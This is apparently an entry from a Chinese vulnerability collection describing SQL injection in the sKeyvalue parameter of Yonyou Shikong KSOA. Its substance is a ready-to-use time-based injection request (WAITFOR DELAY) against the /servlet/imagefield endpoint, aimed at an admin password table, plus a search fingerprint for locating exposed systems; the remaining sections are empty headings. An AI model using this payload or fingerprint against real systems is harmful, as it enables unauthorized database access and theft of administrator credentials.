# 用友时空KSOAsKeyvalue参数存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友时空 KSOA"`
- **请求**：`GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=98EF9186449EEBA7CEF3B2F0A46DD920`

**请求体 / payload**
```

```

**其他**
- 用友时空KSOA sKeyvalue参数存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 资产测绘
* 四、漏洞复现
***
- 版本: * 用友时空KSOA